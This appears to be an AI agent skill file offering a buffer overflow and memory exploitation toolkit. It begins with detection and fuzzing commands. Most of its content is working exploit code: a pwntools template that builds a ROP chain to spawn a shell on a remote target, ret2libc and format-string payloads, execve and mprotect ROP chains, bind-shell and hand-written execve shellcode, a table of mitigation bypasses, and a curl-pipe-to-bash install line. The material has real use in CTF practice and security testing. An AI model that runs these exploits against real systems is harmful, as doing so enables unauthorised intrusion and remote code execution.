---
name: buffer-overflow
description: Use when exploiting or analyzing buffer overflows, heap corruption, format strings, integer overflows, race conditions, or developing ROP chains. Trigger keywords: buffer overflow, BOF, heap exploit, format string, ROP, ret2libc, shellcode, pwntools, stack smash, memory corruption, ASLR bypass.
---

# Buffer Overflow & Memory Exploitation Toolkit

Comprehensive toolkit for detecting, analyzing, and exploiting memory corruption vulnerabilities in C/C++ binaries.

## Detection

### Static Detection
```bash
# Find dangerous function calls
objdump -d <binary> | grep -E "call.*gets|call.*strcpy|call.*sprintf|call.*scanf|call.*read|call.*memcpy"
objdump -d <binary> | grep -E "call.*system|call.*execve|call.*popen"

# Security hardening check
checksec --file=<binary>
# Reports: Canary, NX, PIE, RELRO (Partial/Full), FORTIFY, ASLR

# Static analysis tools
flawfinder <source.c>
cppcheck --enable=warning --inconclusive <source.c>
semgrep --config=p/c <source.c>
```

### Dynamic Detection
```bash
# AddressSanitizer (detects heap/stack/GLOBAL buffer overflow, use-after-free)
gcc -fsanitize=address -g -o binary source.c

# MemorySanitizer (detects uninitialized reads)
gcc -fsanitize=memory -g -o binary source.c

# Valgrind
valgrind --tool=memcheck --leak-check=full <binary>

# Fuzzing with AFL++
afl-fuzz -i corpus/ -o findings/ -- ./binary @@

# Fuzzing with libFuzzer
clang -fsanitize=fuzzer,address -o binary source.c
```

## Exploitation Development

### Environment Setup
```bash
# Install pwntools
pip install pwntools

# Install GDB plugins
# pwndbg: git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
# GEF: bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

### pwntools Exploit Template
```python
from pwn import *

# Binary info
elf = ELF('./vulnerable')
libc = elf.libc  # or ELF('./libc.so.6')

context.binary = elf
context.terminal = ['tmux', 'splitw', '-h']

def exploit(io):
    # Step 1: Leak addresses (if ASLR bypass needed)
    # Step 2: Calculate offsets
    # Step 3: Build payload (padding + addresses + shellcode/ROP)
    # Step 4: Send payload
    # Step 5: Get shell

    # Offset calculation
    pattern = cyclic(200)
    io.sendline(pattern)
    # Use cyclic_find(eip_value) to get offset

    # ROP chain example (x86_64)
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    binsh = next(elf.search(b'/bin/sh'))
    system = elf.plt['system']
    ret = rop.find_gadget(['ret'])[0]  # stack alignment

    payload = b'A' * offset
    payload += p64(ret)            # stack alignment
    payload += p64(pop_rdi)        # pop rdi; ret
    payload += p64(binsh)          # "/bin/sh" address
    payload += p64(system)         # system()

    io.sendline(payload)
    io.interactive()

if args.REMOTE:
    io = remote('target.ip', 1337)
elif args.GDB:
    io = gdb.debug('./vulnerable', '''
        b *main+100
        continue
    ''')
else:
    io = process('./vulnerable')

exploit(io)
```

### Common Exploit Categories

#### Stack Buffer Overflow
```python
# Classic stack smash
offset = cyclic_find(eip_value)
payload = b'A' * offset + p32(win_address)

# ret2libc (NX bypass)
payload = b'A' * offset
payload += p32(system_addr)     # return to system()
payload += b'JUNK'              # return address after system
payload += p32(binsh_addr)      # arg: "/bin/sh"
```

#### Format String
```python
# Arbitrary write via %n
# Write target_address value to arbitrary location
payload = fmtstr_payload(offset, {target_addr: desired_value})
```

#### Heap Exploitation
```python
# Use-After-Free (UAF)
# 1. Allocate object A
# 2. Free object A  
# 3. Allocate object B (reuses A's memory)
# 4. Use dangling pointer to A → now controls B

# Double Free
# 1. Free chunk A
# 2. Free chunk A again (poisons tcache/fastbin)
# 3. Malloc returns address inside free list
```

#### ROP Chains (x86_64)
```python
# execve("/bin/sh", NULL, NULL)
rop = ROP(elf)
rop.execve(next(elf.search(b'/bin/sh')), 0, 0)
print(rop.dump())

# mprotect + shellcode (NX bypass)
rop = ROP(elf)
rop.mprotect(shellcode_addr, 0x1000, 7)  # RWX
rop.raw(shellcode_addr)                   # jump to shellcode
```

### Shellcraft (shellcode generation)
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())          # x86/x64 execve /bin/sh
shellcode = asm(shellcraft.cat('flag'))   # read flag file
shellcode = asm(shellcraft.amd64.linux.bindsh(1337))  # bind shell

# Custom shellcode
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f  // "/bin/sh"
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
''')
```

## Mitigation Reference

| Protection | Bypass Technique |
|------------|-----------------|
| NX/DEP | ret2libc, ROP, mprotect/shellcode |
| ASLR | Info leak, partial overwrite, brute-force (32-bit) |
| Stack Canary | Leak canary, brute-force (forked servers), overwrite master canary |
| PIE | Info leak, partial overwrite |
| Full RELRO | ret2dlresolve (before Full RELRO), overwrite hook functions |
| FORTIFY_SOURCE | Use raw syscalls, avoid fortified functions |

## Reporting

Document each finding with:
- Vulnerability type and location (file:function:line)
- Exploitability assessment (trivial/moderate/difficult/infeasible)
- Required bypasses
- Proof-of-concept exploit script
- Mitigation recommendation with exact compiler/linker flags